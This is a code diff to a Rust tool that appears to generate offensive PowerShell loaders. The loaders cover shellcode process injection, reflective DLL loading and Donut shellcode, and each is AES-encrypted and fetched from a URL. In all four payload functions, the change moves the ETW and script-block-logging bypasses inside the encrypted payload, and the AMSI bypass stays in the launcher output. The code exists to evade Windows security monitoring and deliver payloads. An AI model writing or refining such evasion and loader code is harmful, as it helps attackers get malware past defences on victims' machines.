@@ -41,7 +41,7 @@ pub fn powershell_payload(matches: &ArgMatches) {
     let testurl = check_url(matches.value_of("url").unwrap());
     let url = testurl.as_str();
     let payload_path = matches.value_of("payload").unwrap();
-    let payload = if path::Path::new(payload_path).exists() {
+    let mut payload = if path::Path::new(payload_path).exists() {
         fs::read_to_string(payload_path).unwrap()
     } else {
         println!("Could not find payload");
@@ -60,6 +60,14 @@ pub fn powershell_payload(matches: &ArgMatches) {
     println!("Generate HTA: {}", hta);
 
     // encrypt
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        payload = format!("{}{}", etw_bypass ,payload);
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        payload = format!("{}{}", scriptlog_bypass ,payload);
+    }
     let (key, ciphertext) = util::aes::encrypt(&payload);
     let ciphertext_b64 = util::base64::base64encode(ciphertext);
 
@@ -75,14 +83,6 @@ pub fn powershell_payload(matches: &ArgMatches) {
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_etw {
-        let etw_bypass = util::payload::get_etw();
-        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_scriptlog {
-        let scriptlog_bypass = util::payload::get_scriptlog();
-        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
     }
 
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
@@ -124,6 +124,8 @@ pub fn shellcode_payload(matches: &ArgMatches) {
     let disable_scriptlog = if matches.is_present("disable_scriptlog") { true } else { false };
     let hta = if matches.is_present("generate_hta") { true } else { false };
     println!("Target URL: {}", url);
+
+    // encrypt
     if dll_to_shellcode {
         println!("DLL: {}", target_path);
     } else {
@@ -138,13 +140,21 @@ pub fn shellcode_payload(matches: &ArgMatches) {
     // prepare invoker and shellcode
     let invoker = util::payload::get_invoke_shellcode();
     let shellcode_b64 = util::base64::base64encode(&shellcode);
-    let payload = if matches.is_present("target-process") {
+    let mut payload = if matches.is_present("target-process") {
         let target_process = matches.value_of("target-process").unwrap();
         println!("Target process: {}", target_process);
         util::payload::shellcode_process_inject_loader(&invoker, &shellcode_b64, &target_process)
     } else {
         util::payload::shellcode_loader(&invoker, &shellcode_b64)
     };
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        payload = format!("{}{}", etw_bypass ,payload);
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        payload = format!("{}{}", scriptlog_bypass ,payload);
+    }
     let (key, ciphertext) = util::aes::encrypt(&payload);
     let ciphertext_b64 = util::base64::base64encode(ciphertext);
 
@@ -160,14 +170,6 @@ pub fn shellcode_payload(matches: &ArgMatches) {
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_etw {
-        let etw_bypass = util::payload::get_etw();
-        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_scriptlog {
-        let scriptlog_bypass = util::payload::get_scriptlog();
-        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
     }
 
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
@@ -208,7 +210,17 @@ pub fn reflective_payload(matches: &ArgMatches) {
     // prepare invoker and shellcode
     let invoker = util::payload::get_invoke_reflective();
     let dll_b64 = util::base64::base64encode(&dll);
-    let payload = util::payload::dll_loader(&invoker, &dll_b64);
+    let mut payload = util::payload::dll_loader(&invoker, &dll_b64);
+
+    // encrypt
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        payload = format!("{}{}", etw_bypass ,payload);
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        payload = format!("{}{}", scriptlog_bypass ,payload);
+    }
     let (key, ciphertext) = util::aes::encrypt(&payload);
     let ciphertext_b64 = util::base64::base64encode(ciphertext);
 
@@ -224,14 +236,6 @@ pub fn reflective_payload(matches: &ArgMatches) {
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_etw {
-        let etw_bypass = util::payload::get_etw();
-        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_scriptlog {
-        let scriptlog_bypass = util::payload::get_scriptlog();
-        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
     }
 
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
@@ -278,7 +282,17 @@ pub fn donut_payload(matches: &ArgMatches) {
     // prepare invoker and shellcode
     let invoker = util::payload::get_invoke_donut();
     let shellcode_b64 = util::base64::base64encode(&shellcode);
-    let payload = util::payload::donut_loader(&invoker, &shellcode_b64, &target_process);
+    let mut payload = util::payload::donut_loader(&invoker, &shellcode_b64, &target_process);
+
+    // encrypt
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        payload = format!("{}{}", etw_bypass ,payload);
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        payload = format!("{}{}", scriptlog_bypass ,payload);
+    }
     let (key, ciphertext) = util::aes::encrypt(&payload);
     let ciphertext_b64 = util::base64::base64encode(ciphertext);
 
@@ -294,14 +308,6 @@ pub fn donut_payload(matches: &ArgMatches) {
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_etw {
-        let etw_bypass = util::payload::get_etw();
-        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
-    }
-    if !disable_scriptlog {
-        let scriptlog_bypass = util::payload::get_scriptlog();
-        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
     }
 
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
